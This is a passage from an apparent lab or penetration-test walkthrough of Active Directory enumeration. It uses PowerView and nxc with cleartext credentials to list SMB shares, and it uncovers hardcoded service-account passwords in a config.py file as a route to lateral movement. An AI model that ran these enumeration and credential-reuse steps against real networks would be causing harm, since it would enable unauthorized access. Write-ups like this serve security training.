    [string]$LogFile = "ShareAccessTest_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv" 
)
[...SNIP...]
```

This user appears to be part of the `T1 Access Accounts` group, which suggests they likely have Tier 1 access across the domain. To confirm this, we can query their account information using PowerView and Bloodhound

```
╭─LDAP─[dc02.asia.earth.local]─[ASIA\Nathan_CARTER]-[NS:10.5.10.20]
╰─PV ❯ Get-NetUser T1-J.BARTOLEMO -Props *
[2025-06-24 07:33:36] [Formatter] Results from cache. Use 'Clear-Cache' or '-NoCache' to refresh.
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : John BARTOLEMO
distinguishedName                 : CN=John BARTOLEMO,CN=Users,DC=asia,DC=earth,DC=local
memberOf                          : CN=T1 Access Accounts,CN=Users,DC=asia,DC=earth,DC=local
name                              : John BARTOLEMO
objectGUID                        : {d8eccd9d-9dc6-4dad-908d-6bb30f37a4cd}
userAccountControl                : NORMAL_ACCOUNT
badPwdCount                       : 0
badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 5 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 01/01/1601 00:00:00 (424 years, 5 months ago)
pwdLastSet                        : 19/06/2025 00:01:35 (5 days ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-114237654-1594001096-2651204834-1585
sAMAccountName                    : T1-J.BARTOLEMO
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=earth,DC=local

```


![[Authenticated access-20250624011029123.webp|1043]]


The `memberOf` attribute confirms the user’s group membership, indicating their association with the `T1 Access Accounts` group.

Given the elevated access implied by their group, it’s worth checking the file server again to see what this user has access to. Using `nxc`, we can enumerate accessible shares:


```
nxc smb 10.5.10.50 -u 'T1-J.BARTOLEMO' -p 'Jp@ssW0rd!@' --shares -M spider_plus

SMB         10.5.10.50      445    FS01             [*] Windows Server 2022 Build 20348 x64 (name:FS01) (domain:asia.earth.local) (signing:False) (SMBv1:False) 
SMB         10.5.10.50      445    FS01             [+] asia.earth.local\T1-J.BARTOLEMO:Jp@ssW0rd!@ 
SPIDER_PLUS 10.5.10.50      445    FS01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.5.10.50      445    FS01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.5.10.50      445    FS01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.5.10.50      445    FS01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.5.10.50      445    FS01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.5.10.50      445    FS01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.5.10.50      445    FS01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.5.10.50      445    FS01             [*] Enumerated shares
SMB         10.5.10.50      445    FS01             Share           Permissions     Remark
SMB         10.5.10.50      445    FS01             -----           -----------     ------
SMB         10.5.10.50      445    FS01             ADMIN$                          Remote Admin
SMB         10.5.10.50      445    FS01             C$                              Default share
SMB         10.5.10.50      445    FS01             IPC$            READ            Remote IPC
SMB         10.5.10.50      445    FS01             onboard         READ            Public share used for onboarding new hires, and for sharing files with the team.
SMB         10.5.10.50      445    FS01             t1-biosphere    READ,WRITE      Biosphere tools and resources for T1 Access Accounts
SMB         10.5.10.50      445    FS01             t1-scripts      READ,WRITE      Scripts and tools for T1 Access Accounts
SPIDER_PLUS 10.5.10.50      445    FS01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.5.10.50.json".
SPIDER_PLUS 10.5.10.50      445    FS01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, onboard, t1-biosphere, t1-scripts)
SPIDER_PLUS 10.5.10.50      445    FS01             [*] SMB Readable Shares:  4 (IPC$, onboard, t1-biosphere, t1-scripts)
SPIDER_PLUS 10.5.10.50      445    FS01             [*] SMB Writable Shares:  2 (t1-biosphere, t1-scripts)
SPIDER_PLUS 10.5.10.50      445    FS01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.5.10.50      445    FS01             [*] Total folders found:  1
SPIDER_PLUS 10.5.10.50      445    FS01             [*] Total files found:    11
SPIDER_PLUS 10.5.10.50      445    FS01             [*] File size average:    3.17 KB
SPIDER_PLUS 10.5.10.50      445    FS01             [*] File size min:        60 B
SPIDER_PLUS 10.5.10.50      445    FS01             [*] File size max:        8.54 KB

```

The access provided through the `T1 Access Accounts` group is now confirmed in practice. On the `FS01` host, we gain visibility into two additional shares named `t1-biosphere` and `t1-scripts`. Continuing with enumeration and analysis, we explore the contents of `t1-biosphere` and identify a file named `config.py`. Inside, we uncover another instance of hardcoded credentials:

```
cat config.py 

SERVICE_USERNAME = "T1-W.STONE"
SERVICE_PASSWORD = "WSt0n3P@ssw0rd"

API_BASE_URL = "https://api.internal.asia.earth.local"
API_TIMEOUT = 30
API_RETRY_COUNT = 3
```

Now we turn our attention to the newly discovered user `T1-W.STONE` to better understand their level of access. Using the same tools as previously, we enumerate their account details

```
╭─LDAP─[dc02.asia.earth.local]─[ASIA\Nathan_CARTER]-[NS:10.5.10.20] [CACHED]
╰─PV ❯ Get-NetUser T1-W.STONE -Props *                                                                                                                                                                             
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
cn                                : T1-W.STONE
distinguishedName                 : CN=T1-W.STONE,CN=Users,DC=asia,DC=earth,DC=local
memberOf                          : CN=T1 Web Developers,CN=Users,DC=asia,DC=earth,DC=local
                                    CN=T1 Access Accounts,CN=Users,DC=asia,DC=earth,DC=local
name                              : T1-W.STONE
objectGUID                        : {c0025395-a471-4b8e-8b8c-f74be38041dd}
userAccountControl                : NORMAL_ACCOUNT
badPwdCount                       : 0
badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 5 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 24/06/2025 00:07:35 (today)
pwdLastSet                        : 19/06/2025 00:01:36 (5 days ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-114237654-1594001096-2651204834-1588
sAMAccountName                    : T1-W.STONE
sAMAccountType                    : SAM_USER_OBJECT
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=earth,DC=local
```


![[Authenticated access-20250624015459501.webp]]


This approach works well because it follows a simple and repeatable pattern. We find credentials, check what the user can access, and use that access to find more useful information. Step by step, this creates a clear path to move deeper into the network.

